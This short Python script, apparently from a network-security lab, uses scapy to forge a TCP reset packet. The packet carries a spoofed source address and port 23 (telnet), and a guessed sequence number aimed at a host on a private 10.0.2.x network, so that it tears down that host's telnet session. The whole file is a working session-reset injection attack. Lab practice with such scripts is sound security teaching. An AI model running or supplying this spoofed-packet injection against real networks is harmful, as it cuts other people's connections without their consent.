#!/user/bin/python3
import sys
from scapy.all import * 

print("sending reset packet....")
IPLayer = IP(src = "10.0.2.7", dst="10.0.2.6")
TCPLayer = TCP(sport=23, dport=46792, flags="R", seq=635442851) 
pkt = IPLayer/TCPLayer
ls(pkt)
send(pkt, verbose=0)
